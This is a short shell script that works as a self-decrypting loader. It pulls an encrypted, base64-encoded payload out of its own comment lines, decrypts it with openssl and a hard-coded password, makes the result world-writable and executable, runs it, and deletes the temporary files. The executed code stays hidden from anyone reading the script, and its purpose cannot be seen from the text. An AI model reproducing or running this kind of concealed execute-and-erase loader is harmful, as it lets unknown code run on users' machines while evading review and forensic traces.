#!/bin/sh
filename="$0"
key="asdffdsa"
payload=()
while read -r line; do
    row="$line"
    if [ "$row" == "# Start payload" ]; then
    	while read -r line; do
    		row="$line"
    		if [ "$row" == "# End payload" ]; then
# Start payload
# U2FsdGVkX1/sR6BSVb24vkVlwoEd4fw9q0AJOjmDxWq8twhYprob33H09R3uZmtY
# aqzZDIg5lHHDJwdintAteYEiVG3+uMmEnoaIUBRm7oLjPa52jxQj7JeNLne6+W5r
# End payload
    			break
    		fi
    		row=$(echo "$row" | cut -d' ' -f 2)
    		payload+=("$row")
    	done
	fi
done < "$filename"

for (( i=0; i<${#payload[@]}; i++ )); do
	echo "${payload[i]}" >> xxxxxxxxxxencrypt.sh
done

echo "#!/bin/sh" >> xxxxxxxxxxdecrypt.sh
openssl enc -d -aes-128-cbc -a -salt -pass pass:$key -in xxxxxxxxxxencrypt.sh >> xxxxxxxxxxdecrypt.sh
chmod 777 xxxxxxxxxxdecrypt.sh
sh ./xxxxxxxxxxdecrypt.sh
rm xxxxxxxxxxencrypt.sh
rm xxxxxxxxxxdecrypt.sh
